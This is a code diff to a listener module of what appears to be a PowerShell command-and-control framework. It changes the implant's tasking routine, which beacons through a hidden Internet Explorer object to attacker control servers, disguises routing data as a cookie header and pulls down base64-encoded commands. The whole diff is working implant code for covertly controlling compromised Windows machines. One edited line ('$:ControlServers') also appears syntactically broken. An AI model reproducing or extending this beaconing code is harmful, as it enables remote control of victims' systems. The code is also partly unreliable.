@@ -587,38 +587,41 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                    $script:GetTask = {{
+                        param($FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+
+                        try {{
+                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "%s: $RoutingCookie"
-                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $Headers = "{reqheader}: $RoutingCookie"
+                                $FixedParameters["headers"].GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                $ServerURI = $:ControlServers[$Script:ServerIndex] + $taskURI
 
                                 $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
-                                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
+                                while($Script:IE.busy -eq $true){{Start-Sleep -Milliseconds 100}}
                                 $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml
-                                try {
+                                try {{
                                     [System.Convert]::FromBase64String($html)
-                                }
-                                catch {$Null}
-                            }
-                        }
-                        catch {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                }}
+                                catch {{$Null}}
+                            }}
+                        }}
+                        catch {{
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
-                """ % (listenerOptions['RequestHeader']['Value'])
+                            }}
+                        }}
+                    }}
+                """.format(ControlServers = updateServers,reqheader = listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
                     $script:SendMessage = {
